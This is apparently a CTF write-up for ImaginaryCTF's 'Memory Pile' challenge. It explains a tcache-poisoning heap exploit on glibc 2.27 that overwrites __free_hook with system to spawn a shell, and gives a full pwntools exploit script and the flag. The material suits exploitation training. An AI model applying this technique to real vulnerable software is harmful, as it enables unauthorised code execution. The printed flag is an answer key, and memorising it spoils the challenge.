# Memory Pile

## Task

Memory leaks can be fun, but do you know what's even more fun? Heap exploits!

* [memory pile](https://imaginaryctf.org/r/4235-memory_pile)
* [libc](https://imaginaryctf.org/r/9C87-libc-2.27.so)
* [ld](https://imaginaryctf.org/r/169E-ld-2.27.so)
* nc chal.imaginaryctf.org 42007

## Solution

We see the libc, we see it's heap, so tcache go brr.

First we allocate something so we don't get
some random free. Then we deallocate that to get get
the block emptied and since the old pointer didn't get cleared
we get control over the next pointer in the empty block.
We then want that to point to the free hook pointer in libc,
so we just write that address, allocate once such that
the next pointer is used and allocate again to get control
over the memory at the next pointer (so the free hook)

We then overwrite that with the address to libc and call
free on a block which contains `/bin/sh` to effectively
execute `system("/bin/sh")`

```python
io = start()

libc = ELF("./libc-2.27.so")

io.recvline()
io.recvline()
printf = int(io.recvline(),0)
libc.address = printf-libc.sym.printf
log.info("Got libc: %x", libc.address)
log.info("Got libc: %x", libc.sym.__free_hook)

def acquire(idx):
    io.recvuntil(b"Choose wisely > ")
    io.sendline(b"1")
    io.recvuntil(b"responsibility > ")
    io.sendline(str(idx).encode())
def release(idx):
    io.recvuntil(b"Choose wisely > ")
    io.sendline(b"2")
    io.recvuntil(b"responsibility > ")
    io.sendline(str(idx).encode())
def fill(idx,contents):
    io.recvuntil(b"Choose wisely > ")
    io.sendline(b"3") # fill
    io.recvuntil(b"responsibility > ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"boss > ")
    io.sendline(contents)


acquire(0)
release(0)
fill(0, p64(libc.sym.__free_hook))
acquire(0)
acquire(0)
fill(0, p64(libc.sym.system))
acquire(0)
fill(0, b"/bin/sh")
release(0)

io.interactive()

```

And the flag:

`ictf{hemlock_for_the_tcache}`
